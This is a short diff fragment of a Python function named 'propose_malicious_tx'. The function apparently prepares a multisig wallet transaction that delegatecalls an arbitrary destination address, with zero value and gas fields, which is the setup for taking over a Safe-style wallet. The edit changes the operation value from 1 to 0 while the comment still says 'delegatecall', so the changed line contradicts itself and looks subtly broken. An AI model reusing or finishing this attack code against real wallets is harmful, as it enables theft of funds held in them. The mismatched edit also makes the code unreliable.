@@ -87,7 +87,7 @@ def propose_malicious_tx(
     to            = w3.to_checksum_address(delegatecallDestination)
     valueStr      = "0"
     dataHex       = "0x"    # no data
-    operation     = 1       # delegatecall
+    operation     = 0       # delegatecall
     safeTxGasStr  = "0"
     baseGasStr    = "0"
     gasPriceStr   = "0"
